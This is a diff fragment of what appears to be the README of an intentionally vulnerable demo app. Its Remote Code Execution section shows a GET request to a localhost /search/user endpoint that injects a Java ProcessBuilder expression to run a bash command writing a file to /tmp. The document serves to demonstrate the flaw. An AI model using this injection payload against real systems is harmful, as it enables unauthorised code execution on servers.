@@ -34,6 +34,8 @@ All the above requests leak sensitive medical and PII data to the logging servic
 
 ### Remote Code Execution
 
+
+
 An RCE can be triggered through the `/search/user` endpoint by sending a `GET` HTTP request as follows:
 
 [http://localhost:8081/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()](http://localhost:8081/search/user?foo=new%20java.lang.ProcessBuilder(%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27echo%203vilhax0r%3E%2Ftmp%2Fhacked%27%7D).start())
